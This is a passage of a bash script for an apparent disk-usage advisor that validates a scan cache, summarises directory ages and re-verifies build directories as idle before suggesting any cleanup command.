  while IFS=$'\t' read -r sz p conf age; do
    [ -n "$p" ] || continue
    disk_is_uint "$sz" || continue
    if ! disk_is_uint "$age"; then unk=$(( unk + sz ))
    elif [ "$age" -ge $(( DISK_AGE_OLD_DAYS * 86400 )) ]; then old=$(( old + sz ))
    elif [ "$age" -ge $(( DISK_AGE_MID_DAYS * 86400 )) ]; then mid=$(( mid + sz ))
    else new=$(( new + sz ))
    fi
  done <<EOF
$sorted
EOF
  local s="Age breakdown of the listed directories: $(disk_h "$old") older than ${DISK_AGE_OLD_DAYS}d, $(disk_h "$mid") ${DISK_AGE_MID_DAYS}-${DISK_AGE_OLD_DAYS}d, $(disk_h "$new") newer than ${DISK_AGE_MID_DAYS}d"
  [ "$unk" -gt 0 ] && s="$s, $(disk_h "$unk") undated"
  printf '%s.' "$s"
}

# ------------------------------------------------------- the impure wrapper --

advise_disk() {
  local LC_ALL=C
  export LC_ALL
  disk_thresholds
  local cache=${CLAUDE_WATCH_DISK_CACHE:-}
  [ -n "$cache" ] || cache="${STATE:-${CLAUDE_WATCH_HOME:-$HOME/.claude-watch}/state}/disk.tsv"

  if [ ! -f "$cache" ] || [ ! -s "$cache" ]; then
    disk_findings missing - - - - - < /dev/null
    return 0
  fi

  # ---- validate. Anything we would compute on must parse, or the domain is
  # unknown with no findings — never `ok`, and never a garbage finding.
  local epoch='' used='' avail='' dfsize='' mount='' partial=0
  local vols=0 epochs=0 notes=0 scans=0
  local bad=0 k a b c d e extra
  while IFS=$'\t' read -r k a b c d e extra || [ -n "$k" ]; do
    [ -n "$k" ] || continue
    # §3c is a FIVE column format. A row with a sixth field is either a path
    # carrying a tab (which corrupts every field after it) or a format we do
    # not understand; either way the numbers are not trustworthy.
    if [ -n "$e" ] || [ -n "$extra" ]; then bad=1; break; fi
    case $k in
      epoch) epochs=$((epochs + 1)); disk_is_uint "$b" || bad=1; epoch=$b ;;
      scan)
        # Two scan rows means two answers to "was this partial", and taking the
        # last is a silent choice between them.
        scans=$((scans + 1))
        case $a in 0|1) ;; *) bad=1 ;; esac
        case $b in 0|1) ;; *) bad=1 ;; esac
        disk_is_uint "$c" || bad=1
        disk_is_uint "$d" || bad=1
        partial=$a ;;
      note)
        notes=$((notes + 1))
        disk_is_uint "$b" || bad=1
        case $a in deadline|permission_denied|root_off_home_volume|path_unrepresentable|depth_capped) ;; *) bad=1 ;; esac ;;
      vol)
        vols=$((vols + 1))
        disk_is_uint "$b" || bad=1
        disk_is_uint "$c" || bad=1
        # df_size_kb is descriptive, never a denominator — but a non-numeric
        # value still means the scanner wrote something we cannot account for.
        case $d in -) ;; *) disk_is_uint "$d" || bad=1 ;; esac
        mount=$a; used=$b; avail=$c; dfsize=$d ;;
      group)
        [ -n "$a" ] || bad=1
        disk_is_uint "$b" || bad=1
        disk_is_uint "$c" || bad=1
        # U3's `affected` flag gates the per-group severity cap, so an
        # unrecognised value must not fail open into "not affected": that is
        # the path from a malformed row to an inherited-critical finding with a
        # command attached. '' and '-' are the legacy absent field.
        case $d in ''|-|0|1) ;; *) bad=1 ;; esac ;;
      dir)
        [ -n "$a" ] || bad=1
        disk_is_uint "$b" || bad=1
        [ -n "$c" ] || bad=1
        case $d in confirmed|likely|unverified) ;; *) bad=1 ;; esac ;;
      # An unknown row kind is a newer scanner, not a broken cache: ignore it.
    esac
    [ "$bad" = 1 ] && break
  done < "$cache"

  # §3c: a cache with a note row and no `scan partial=1` is malformed.
  [ "$notes" -gt 0 ] && [ "$partial" != 1 ] && bad=1
  [ "$epochs" = 1 ] || bad=1
  [ "$vols" = 1 ] || bad=1
  [ "$scans" -le 1 ] || bad=1
  if [ "$bad" != 1 ]; then
    disk_is_uint "$used" && disk_is_uint "$avail" || bad=1
  fi
  if [ "$bad" != 1 ] && [ $(( used + avail )) -le 0 ]; then bad=1; fi

  if [ "$bad" = 1 ]; then
    disk_findings malformed - - - - - < /dev/null
    return 0
  fi

  local now age
  now=$(date +%s 2>/dev/null) || now=$epoch
  age=$(( now - epoch )); [ "$age" -ge 0 ] || age=0

  disk_findings ok "$used" "$avail" "$dfsize" "$mount" "$age" \
    < <(disk_body "$cache" "$now" "$(( used + avail ))")
  return 0
}

# Reads the cache body and hands back the rows disk_findings consumes, with
# three impure corrections applied:
#
#  1. Revalidate before printing any removal command (§6 U4). The confirmed
#     verdict was reached at scan time; the cache is used silently for 6h and
#     beyond 6h with a stale flag, so a build an hour ago would turn a printed
#     rm -rf '.../target' into a live-cache deletion this tool authored. The
#     gate is disk_confirm_still_valid: identity, then the §3c marker, then a
#     recursive bounded idle probe. Anything short of a clean pass downgrades
#     the row to `likely`, which drops its command.
#  2. The path is rewritten to the resolved form the gate approved, so the
#     command names the object that was inspected.
#  3. A 6th column with each dir's age in seconds, for the transcripts age
#     breakdown. '-' when it cannot be read.
disk_body() {
  local cache=$1 now=$2 total=${3:-0}
  disk_thresholds
  # Pass 1: which groups will produce a finding. Newline-delimited so a label
  # containing a space cannot alias another; a label containing a newline cannot
  # reach here (advise_disk rejects the row first). Two passes, not one, because
  # nothing in §3c orders `group` rows before `dir` rows, so a single-pass
  # version would be silently correct only on caches this scanner happens to
  # write.
  local pub=$'\n' pk pa pb pc pd
  while IFS=$'\t' read -r pk pa pb pc pd || [ -n "$pk" ]; do
    [ "$pk" = group ] || continue
    disk_group_published "$pb" "$total" && pub="$pub$pa"$'\n'
  done < "$cache"

  local stamp cutoff
  # Rebase the clock rather than remember an offset. `t0=$SECONDS` sampled a
  # counter whose phase is the shell's start time, so `SECONDS - t0 >= N` could
  # fire after N-1 seconds of real time — a whole second of a small budget.
  # Assigning 0 resets the counter AND its reference instant, so the test below
  # is exact to the second. This is safe ONLY because disk_body is invoked
  # through a process substitution (`< <(disk_body ...)`) and therefore runs in
  # a subshell: the assignment cannot reach the parent's SECONDS. Re-wiring that
  # call to a plain call would leak it. Sub-second clocks are not available:
  # bash 3.2 on macOS has no EPOCHREALTIME and BSD date has no %N.
  SECONDS=0
  # See DISK_IDLE_SLACK_S: the stamp sits just before the cutoff so that an
  # entry exactly on the 14d line reads as active under find's strict -newer.
  cutoff=$(date -v-${DISK_IDLE_DAYS}d -v-${DISK_IDLE_SLACK_S}S +%Y%m%d%H%M.%S 2>/dev/null)
  stamp=$(mktemp "${TMPDIR:-/tmp}/cw-disk-idle.XXXXXX" 2>/dev/null) || stamp=''
  if [ -n "$stamp" ] && [ -n "$cutoff" ]; then
    touch -t "$cutoff" "$stamp" 2>/dev/null || { rm -f "$stamp"; stamp=''; }
  fi

  local probes=0 k a b c d
  while IFS=$'\t' read -r k a b c d || [ -n "$k" ]; do
    case $k in
      scan|note|group) printf '%s\t%s\t%s\t%s\t%s\n' "$k" "$a" "$b" "$c" "$d" ;;
      dir)
        local conf=$d path=$a age='-' mt resolved
        if [ -d "$a" ]; then
          mt=$(stat -f %m "$a" 2>/dev/null)
          disk_is_uint "$mt" && age=$(( now - mt )) && [ "$age" -ge 0 ] || age='-'
        fi
        if [ "$conf" = confirmed ]; then
          case $pub in
            *$'\n'"$c"$'\n'*) : ;;
            # This group is below the group-warn line, so it produces no finding
            # and this row can never be printed. Probing it burns the budget the
            # publishable rows need — on the machine this was diagnosed on, 1.02s
            # of the 2s budget went on seven node_modules rows that are discarded
            # downstream, and they sort first in the cache. Downgrade rather than
            # pass `confirmed` through unchecked, so the invariant "a confirmed
            # row reaching disk_findings has passed the print-time gate" holds
            # unconditionally.
            *) conf=likely ;;
          esac
        fi
        if [ "$conf" = confirmed ]; then
          if ! disk_path_safe "$a"; then
            conf=likely   # no command would be printed anyway; skip the probe
          elif [ -z "$stamp" ]; then
            conf=likely   # could not build the cutoff: refuse rather than guess
          elif [ "$probes" -ge "$DISK_RESTAT_MAX" ]; then
            conf=likely
          elif [ "$SECONDS" -ge "$DISK_PROBE_SECONDS" ]; then
            conf=likely   # out of wall-clock budget: downgrade, never promote
          else
            probes=$((probes + 1))
            if resolved=$(disk_confirm_still_valid "$a" "$stamp"); then
              path=$resolved
            else
              conf=likely
            fi
          fi
        fi
        printf 'dir\t%s\t%s\t%s\t%s\t%s\n' "$path" "$b" "$c" "$conf" "$age" ;;
    esac
  done < "$cache"
  [ -n "$stamp" ] && rm -f "$stamp"
  return 0
}
